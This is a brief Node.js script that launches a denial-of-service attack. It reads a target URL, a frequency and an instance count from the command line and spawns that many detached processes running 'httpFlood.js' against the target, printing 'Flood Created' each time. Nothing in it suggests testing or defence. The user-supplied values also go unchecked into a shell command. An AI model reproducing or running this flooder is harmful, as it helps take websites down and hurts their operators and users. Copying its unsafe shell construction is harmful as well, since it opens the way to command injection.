const {spawn}=require('child_process');
let url=process.argv[2];
let frequency=process.argv[3];
let floodInstances=process.argv[4];

for(let i=0;i<floodInstances;i++){
    spawn(`node httpFlood.js ${url} ${frequency}`,{shell:true,detached:true});
    console.log("Flood Created");
}